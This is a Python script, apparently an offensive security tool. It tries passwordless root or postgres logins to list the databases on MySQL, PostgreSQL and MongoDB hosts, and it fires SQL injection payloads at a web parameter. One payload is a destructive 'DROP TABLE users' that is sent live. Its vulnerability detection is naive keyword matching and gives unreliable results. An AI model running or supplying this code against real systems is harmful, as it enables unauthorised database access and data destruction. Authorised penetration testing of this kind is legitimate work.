#!/usr/bin/env python3
"""
Advanced Database Explorer
Database enumeration, SQL injection testing, and database security analysis
"""

import sys
import json
import socket
import subprocess
from typing import List, Dict, Optional

def explore_database(host: str, port: int, db_type: str = 'mysql') -> Dict:
    """Explore database structure and enumerate"""
    result = {
        'host': host,
        'port': port,
        'type': db_type,
        'databases': [],
        'tables': [],
        'users': [],
        'vulnerabilities': []
    }
    
    # Try using database-specific tools
    if db_type == 'mysql':
        try:
            # Try mysql command
            cmd = ['mysql', '-h', host, '-P', str(port), '-u', 'root', '-e', 'SHOW DATABASES;']
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if process.returncode == 0:
                for line in process.stdout.split('\n'):
                    if line.strip() and 'Database' not in line:
                        result['databases'].append(line.strip())
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    elif db_type == 'postgresql':
        try:
            cmd = ['psql', '-h', host, '-p', str(port), '-U', 'postgres', '-l']
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if process.returncode == 0:
                for line in process.stdout.split('\n'):
                    if '|' in line and 'Name' not in line:
                        db_name = line.split('|')[0].strip()
                        if db_name:
                            result['databases'].append(db_name)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    elif db_type == 'mongodb':
        try:
            cmd = ['mongo', f'{host}:{port}', '--eval', 'db.adminCommand("listDatabases")']
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if process.returncode == 0:
                # Parse MongoDB output
                import re
                db_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', process.stdout)
                result['databases'] = db_matches
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    # Check for common vulnerabilities
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(5)
        test_socket.connect((host, port))
        test_socket.close()
        
        # Check for default credentials
        if db_type == 'mysql':
            result['vulnerabilities'].append('Check for default MySQL credentials')
        elif db_type == 'postgresql':
            result['vulnerabilities'].append('Check for default PostgreSQL credentials')
        elif db_type == 'mongodb':
            result['vulnerabilities'].append('MongoDB may be exposed without authentication')
    except:
        result['vulnerabilities'].append('Cannot connect to database')
    
    return result

def test_sql_injection(url: str, parameter: str) -> Dict:
    """Test for SQL injection vulnerabilities"""
    import requests
    
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
    ]
    
    results = []
    for payload in payloads:
        try:
            test_url = f"{url}?{parameter}={payload}"
            response = requests.get(test_url, timeout=5)
            
            vulnerable = False
            if 'error' in response.text.lower() or 'sql' in response.text.lower():
                vulnerable = True
            
            results.append({
                'payload': payload,
                'vulnerable': vulnerable,
                'status': response.status_code
            })
        except:
            pass
    
    return {'results': results}

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'Action required (explore or test)'}))
        sys.exit(1)
    
    action = sys.argv[1]
    
    if action == 'explore':
        if len(sys.argv) < 4:
            print(json.dumps({'error': 'Host and port required'}))
            sys.exit(1)
        
        host = sys.argv[2]
        port = int(sys.argv[3])
        db_type = sys.argv[4] if len(sys.argv) > 4 else 'mysql'
        
        result = explore_database(host, port, db_type)
        print(json.dumps({'success': True, 'result': result}))
    
    elif action == 'test':
        if len(sys.argv) < 4:
            print(json.dumps({'error': 'URL and parameter required'}))
            sys.exit(1)
        
        url = sys.argv[2]
        parameter = sys.argv[3]
        
        result = test_sql_injection(url, parameter)
        print(json.dumps({'success': True, **result}))

